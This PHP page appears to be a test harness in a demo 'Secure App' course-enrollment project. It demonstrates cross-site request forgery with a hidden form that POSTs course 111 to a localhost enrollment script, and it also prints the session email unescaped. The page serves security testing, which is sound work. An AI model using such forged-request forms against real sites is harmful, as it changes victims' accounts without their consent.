<?php
session_start();

$GLOBALS['dbPath'] = '../db/persistentconndb.sqlite';
$db = new SQLite3($GLOBALS['dbPath'],  $flags = SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE , $encryptionKey = "");
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="../resources/secure_app.css">
    <meta charset="utf-8" />
    <title>Secure App - CSRF Test</title>
</head>

<body>
    <h1>Cross Site Request Forgery Test</h1>

    <p>
        To test: Login first, then navigate to this page. Press the button. The user is now enrolled with CRN 111 even if they are not a student.
    </p>

    <div id="#maliciouscode">
        <p>Current logged in as: <?php echo $_SESSION['email'];?></p>
        <form action="http://localhost:8000/src/CourseEnrollInsertLogic.php" method="POST">
            <input type="hidden" name="courseid" value="111" />
            <button class="button_large" type="submit" value="Enroll User Maliciously">Enroll User Maliciously</button>
        </form>
    </div>
    <?php
    $sql =<<<EOF
            Select * From Enrollment;
            EOF;
            $ret = $db->query($sql);
        echo "<h1>Enrollment Table Contents</h1>";
        while($row = $ret->fetchArray(SQLITE3_ASSOC) )
        {
            echo "<p>CRN = " . $row['CRN'] . "\n</p>";
            echo "<p>StudentID = " . $row['StudentID'] . "\n</p>";
        }
    ?>
</body>
